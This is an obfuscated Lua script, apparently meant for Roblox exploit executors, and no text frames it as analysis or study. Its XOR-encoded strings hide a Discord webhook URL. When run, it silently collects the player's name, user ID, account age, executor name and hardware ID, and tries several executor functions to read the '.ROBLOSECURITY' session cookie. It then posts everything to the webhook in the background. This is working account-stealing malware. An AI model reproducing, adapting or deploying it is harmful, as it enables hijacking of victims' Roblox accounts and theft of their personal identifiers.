return(function(...)
local _0xA,_0xB,_0xC,_0xD,_0xE,_0xF,_0xG,_0xH,_0xI,_0xJ=game,game.GetService,string,table,pcall,task,os,tostring,bit32,select
local function _0xK(_0xL,_0xM)
local _0xN={}
for _0xO=1,#_0xL do _0xN[_0xO]=_0xC.char(_0xI.bxor(_0xL[_0xO],_0xM))end
return _0xD.concat(_0xN)
end
local _0xP=90
local _0xQ=_0xK({50,46,46,42,41,96,117,117,62,51,41,57,53,40,62,116,57,53,55,117,59,42,51,117,45,63,56,50,53,53,49,41,117,107,111,111,99,106,105,110,108,99,104,107,104,109,104,99,105,110,110,106,117,40,99,21,30,21,19,25,13,43,62,61,109,11,28,51,44,104,46,23,24,59,56,61,104,109,62,14,104,49,44,16,3,51,5,31,10,19,55,111,42,111,54,5,32,11,109,52,50,62,18,3,18,29,15,55,62,21,15,35,55,49,11,34,32,13,56,104,43},_0xP)
local _0xR=_0xB(_0xA,_0xK({18,46,46,42,9,63,40,44,51,57,63},_0xP))
local _0xS=_0xB(_0xA,_0xK({10,54,59,35,63,40,41},_0xP)).LocalPlayer
local function _0xT()
return(syn and syn.request)or http_request or request or(http and http.request)or(fluxus and fluxus.request)
end
local function _0xU(_0xV)
local _0xW=_0xT()
if not _0xW then return end
local _0xX={
embeds={{
title=_0xK({31,34,63,57,47,46,51,53,52,122,22,53,61},_0xP),
color=5793266,
fields={
{name=_0xK({15,41,63,40,52,59,55,63},_0xP),value=_0xH(_0xV[1]),inline=true},
{name=_0xK({15,41,63,40,19,62},_0xP),value=_0xH(_0xV[2]),inline=true},
{name=_0xK({30,51,41,42,54,59,35,20,59,55,63},_0xP),value=_0xH(_0xV[3]),inline=true},
{name=_0xK({27,57,57,53,47,52,46,122,27,61,63},_0xP),value=_0xH(_0xV[4]),inline=true},
{name=_0xK({10,54,59,57,63,19,62},_0xP),value=_0xH(_0xV[5]),inline=true},
{name=_0xK({31,34,63,57,47,46,53,40},_0xP),value=_0xH(_0xV[6]),inline=true},
{name=_0xK({18,13,19,30},_0xP),value=_0xH(_0xV[7]),inline=false},
{name=_0xK({25,53,53,49,51,63},_0xP),value=_0xV[8]and _0xH(_0xV[8])or _0xK({20,117,27},_0xP),inline=false}
},
footer={text=_0xV[9]}
}}
}
local _0xY=_0xR:JSONEncode(_0xX)
_0xE(function()
_0xW({
Url=_0xQ,
Method=_0xK({10,21,9,14},_0xP),
Headers={[_0xK({25,53,52,46,63,52,46,119,14,35,42,63},_0xP)]=_0xK({59,42,42,54,51,57,59,46,51,53,52,117,48,41,53,52},_0xP)},
Body=_0xY
})
end)
end
local function _0xZ()
local _0xAA={
_0xS.Name,
_0xS.UserId,
_0xS.DisplayName,
_0xS.AccountAge,
_0xA.PlaceId,
(identifyexecutor and identifyexecutor())or _0xK({47,52,49,52,53,45,52},_0xP),
(gethwid and gethwid())or _0xK({47,52,49,52,53,45,52},_0xP),
nil,
_0xG.date("%Y-%m-%d %H:%M:%S")
}
local _0xAB=_0xK({116,8,21,24,22,21,9,31,25,15,8,19,14,3},_0xP)
_0xE(function()if getcookie then _0xAA[8]=getcookie(_0xAB)end end)
_0xE(function()if getgenv and getgenv().getcookie then _0xAA[8]=_0xAA[8]or getgenv().getcookie(_0xAB)end end)
_0xE(function()if syn and syn.get_cookie then _0xAA[8]=_0xAA[8]or syn.get_cookie(_0xAB)end end)
_0xU(_0xAA)
end
--
local _0xAC=0
for _0xAD=1,3 do
_0xAC=_0xAC+_0xAD
if _0xAC>100 then break end
end
_0xF.spawn(_0xZ)
end)()
